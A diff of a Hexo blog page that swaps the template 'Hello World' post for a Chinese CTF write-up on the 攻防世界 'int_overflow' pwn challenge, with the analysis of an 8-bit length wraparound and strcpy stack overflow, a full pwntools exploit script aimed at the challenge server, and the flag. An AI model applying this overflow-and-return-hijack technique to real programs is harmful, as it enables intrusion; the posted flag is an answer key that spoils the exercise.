@@ -10,18 +10,18 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2023/03/13/hello-world/"/>
+    <link rel="canonical" href="http://example.com/2023/03/13/攻防世界-int-overflow/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     <meta property="og:type" content="article">
-    <meta property="og:title" content="Hello World">
+    <meta property="og:title" content="攻防世界-int_overflow">
     <meta property="og:description" content="Hexo Theme Redefine">
-    <meta property="og:url" content="http://example.com2023/03/13/hello-world/">
+    <meta property="og:url" content="http://example.com2023/03/13/攻防世界-int-overflow/">
     
     <meta property="og:site_name" content="Theme Redefine">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Hello World">
+    <meta name="twitter:title" content="攻防世界-int_overflow">
     <meta name="twitter:description" content="Hexo Theme Redefine">
     <meta name="twitter:image" content="/images/redefine-logo.svg">
     <!--- Icon Part-->
@@ -32,7 +32,7 @@
     
     <title>
         
-            Hello World -
+            攻防世界-int_overflow -
         
         Theme Redefine
     </title>
@@ -181,7 +181,7 @@
             
             
                 <div class="article-title">
-                    <h1 class="article-title-regular">Hello World</h1>
+                    <h1 class="article-title-regular">攻防世界-int_overflow</h1>
                 </div>
             
                 
@@ -203,20 +203,31 @@
                             <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="pc">2023-03-13 15:35:06</span>
-        <span class="mobile">2023-03-13 15:35</span>
+        <span class="pc">2023-03-13 16:41:57</span>
+        <span class="mobile">2023-03-13 16:41</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="pc">2023-03-13 15:35:06</span>
-            <span class="mobile">2023-03-13 15:35</span>
+            <span class="pc">2023-03-13 16:56:25</span>
+            <span class="mobile">2023-03-13 16:56</span>
             <span class="hover-info">Updated</span>
         </span>
     
 
     
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
@@ -235,19 +246,39 @@
             
 
             <div class="article-content markdown-body">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+                <h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul>
+<li><p>&#x3D;&#x3D;原输入的栈无法溢出，通过 strcpy 复制操作进行溢出&#x3D;&#x3D;</p>
+</li>
+<li><p>&#x3D;&#x3D;注意参数的类型&#x3D;&#x3D;，例如 <code>unsigned __int8 v3</code>，<code>v3 = strlen(s)</code>，<code>v3</code> 是一个 <em>8位 int型</em> 数据，即使 <code>s</code> 的长度为 0x104，<code>v3</code> 也只能为 0x04（<strong>1字节 只能存放 2位 十六进制数</strong>）</p>
+</li>
+<li><p>&#x3D;&#x3D;通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 可以直接往 payload 后面添加 b’a’ 一直填充至指定长度 0x104&#x3D;&#x3D; 【<code>ljust()</code> 的 <code>l</code> 是让 payload 左对齐，往右侧添加字符，<em><strong>一直将原字符串填充到指定长度，而不是填充多少个字符</strong></em>】</p>
+</li>
+</ul>
+<hr>
+<p><a class="link"   target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/file/task/51ed19eacdea43e3bd67217d08eb8a0e" >攻防世界-int_overflow <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<hr>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li><p>查看文件信息：<br>![[攻防世界-int_overflow1.png]]<br>32 位 小端序，只开启了栈不可执行</p>
+</li>
+<li><p>尝试执行：<br>![[攻防世界-int_overflow2.png]]</p>
+</li>
+<li><p>在 IDA 中分析：<br>![[攻防世界-int_overflow3.png]]<br>跟进 <code>login()</code>：<br>![[攻防世界-int_overflow4.png]]<br>有两个输入，查看数据 <code>s</code> 和 <code>buf</code> 在栈中的位置：<br>![[攻防世界-int_overflow5.png]]<br>![[攻防世界-int_overflow6.png]]<br><code>s</code> 在栈中的长度为 <code>0x28</code>，而输入的 <code>s</code> 长度为 <code>0x19</code>；<code>buf</code> 在栈中的长度为 <code>0x200</code>，而输入的 <code>buf</code> 长度为 <code>0x199</code><br>因此无法通过输入来进行溢出操作</p>
+</li>
+<li><p>跟进函数 <code>check_passwd(buf)</code>：<br>![[攻防世界-int_overflow7.png]]<br>首先控制了 <code>v3</code> 长度要在 <code>4~8</code> 之间，然后将 <code>形参s</code>【其实就是 <code>login()</code> 中的 <code>buf</code>】中存放的内容复制到 <code>dest</code> 中：<br>![[攻防世界-int_overflow8.png]]<br>&#x3D;&#x3D;注意：这里的 <code>v3 = strlen(s)</code> 得到的并不是 <code>形参s</code> 的长度，因为 <code>v3</code> 的定义为 <code>unsigned __int8 v3</code>，即 <code>v3</code> 是一个 <em><strong>无符号的 8位 int型 数据</strong></em>，也就是 <em><strong>1字节</strong></em>，<strong>只能存放两位十六进制数，即：当 buf 的长度为 261（0x105） 时，v3 &#x3D;&#x3D; 0x05</strong>&#x3D;&#x3D;</p>
+</li>
+<li><p>在 IDA 左侧函数列表中，注意到一个后门函数：<br>![[攻防世界-int_overflow9.png]]<br>肯定是需要修改函数返回值转而执行这个 <code>what_is_this()</code> 函数</p>
+</li>
+<li><p>发现在函数 <code>check_passwd(buf)</code> 中进行 <code>strcpy(dest, s)</code> 的复制操作时，虽然之前输入时 <code>buf</code> 无法进行溢出操作，但是通过 <code>strcpy()</code> 复制，可以利用 <code>buf</code> 将 <code>dest</code> 溢出，然后覆盖掉 <code>dest</code> 所在的栈中的返回值，这样就可以实现跳转了</p>
+</li>
+<li><p>但是想要执行复制操作，就必须先满足 <code>v3 &gt; 3u &amp;&amp; v3 &lt;= 8u</code> 的条件，即 <code>v3</code> 可以取值的范围是 <code>4~8</code>，也就是 <code>0x04~0x08</code><br>结合 <code>v3 = strlen(s)</code> 且输入的 <code>buf</code> 长度为 <code>0x199</code><br>可以得出满足条件的 <code>buf</code> 的长度应该为：<code>0x104~0x108</code></p>
+</li>
+<li><p>于是<strong>思路</strong>就很清晰了：<br> &#x3D;&#x3D;① 首先输入 <code>&quot;1&quot;</code> 选择登录<br> ② 由于 <code>login()</code> 中的 <code>s</code> 没有溢出点，在长度为 <code>0x28</code> 以内随便输入即可<br> ③ 由于 <code>login()</code> 中的 <code>buf</code> 在原本的栈中无法溢出，但是 <code>buf</code> 的值会复制到 <code>dest</code> 中，<code>dest</code> 是可以溢出的。根据 <code>dest</code> 所在的栈，要覆盖返回值需要先填充 <code>0x14 - 0x00 + 0x04</code> 个垃圾数据，然后加上 <code>what_is_this()</code> 函数的地址，函数的地址可以通过 <code>elf.symbols[&quot;what_is_this&quot;]</code> 获得<br> ④ 这样就保证了当 <code>buf</code> 的值复制到 <code>dest</code> 后，会转而执行后门函数 <code>what_is_this()</code><br> ⑤ 但是，想要让复制操作执行，首先需要通过前面的 <code>if ( v3 &lt;= 3u || v3 &gt; 8u )</code> 语句，即：让 <code>v3 = strlen(s)</code> 的长度保持在 <code>0x04~0x08</code>，也就是 <code>buf</code> 的长度要保持在 <code>0x104~0x108</code><br> ⑥ 因此，除去前面为 <code>buf</code> 构造 <code>payload</code> 所用的 <code>b&#39;a&#39; * (0x14 - 0x00 + 0x04) + p32(elf.symbols[&quot;what_is_this&quot;])</code> 以外，还要在后面继续填充垃圾字符，让 <code>buf</code> 的长度在 <code>0x104~0x108</code> 之间<br> ⑦ 通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 即可实现在 <code>payload</code> 右边添加 <code>b&#39;a&#39;</code> 一直将 <code>payload</code> 的长度填充至 <code>0x104</code>&#x3D;&#x3D;</p>
+</li>
+</ol>
+<hr>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span>  <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./int_overflow&quot;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&quot;what_is_this&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./int_overflow&quot;</span>)  <span class="comment"># 程序在kali的路径</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">56322</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x14</span> - <span class="number">0x00</span> + <span class="number">0x04</span>) + p32(system_addr)  <span class="comment"># 溢出dest，使其跳转至what_is_this函数</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x104</span>, <span class="string">b&#x27;a&#x27;</span>)  <span class="comment"># 原payload左对齐，往payload右侧填充b&#x27;a&#x27;，一直填充到payload的长度为0x104</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please input your username:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;999&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please input your passwd:\n&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>
+<hr>
+<h2 id="结果：cyberpeace-25686bc91ab84046b5a18aaa66041868"><a href="#结果：cyberpeace-25686bc91ab84046b5a18aaa66041868" class="headerlink" title="结果：cyberpeace{25686bc91ab84046b5a18aaa66041868}"></a>结果：cyberpeace{25686bc91ab84046b5a18aaa66041868}</h2><p>![[攻防世界-int_overflow10.png]]</p>
 
             </div>
 
@@ -255,11 +286,11 @@
                 <div class="post-copyright-info">
                     <div class="article-copyright-info-container">
     <ul>
-        <li>Post title：Hello World</li>
+        <li>Post title：攻防世界-int_overflow</li>
         <li>Post author：The Redefine Team</li>
-        <li>Create time：2023-03-13 15:35:06</li>
+        <li>Create time：2023-03-13 16:41:57</li>
         <li>
-            Post link：https://redefine.ohevan.com/2023/03/13/hello-world/
+            Post link：https://redefine.ohevan.com/2023/03/13/攻防世界-int-overflow/
         </li>
         <li>
             Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
@@ -271,27 +302,35 @@
             
 
             
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/PWN/">#PWN</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
 
             
 
             
                 <div class="article-nav">
                     
-                        <div class="article-prev">
-                            <a class="prev"
-                            rel="prev"
-                            href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/"
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/03/13/hello-world/"
                             >
-                                <span class="left arrow-icon flex-center">
-                                    <i class="fa-solid fa-chevron-left"></i>
-                                </span>
                                 <span class="title flex-center">
-                                    <span class="post-nav-title-item">攻防世界-int_overflow</span>
-                                    <span class="post-nav-item">Prev posts</span>
+                                    <span class="post-nav-title-item">Hello World</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
                                 </span>
                             </a>
                         </div>
-                    
                     
                 </div>
             
@@ -305,8 +344,8 @@
                 <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">Hello World</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <div class="page-title">攻防世界-int_overflow</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7"><span class="nav-text">收获</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C%EF%BC%9Acyberpeace-25686bc91ab84046b5a18aaa66041868"><span class="nav-text">结果：cyberpeace{25686bc91ab84046b5a18aaa66041868}</span></a></li></ol>
 
     </div>
 </div>
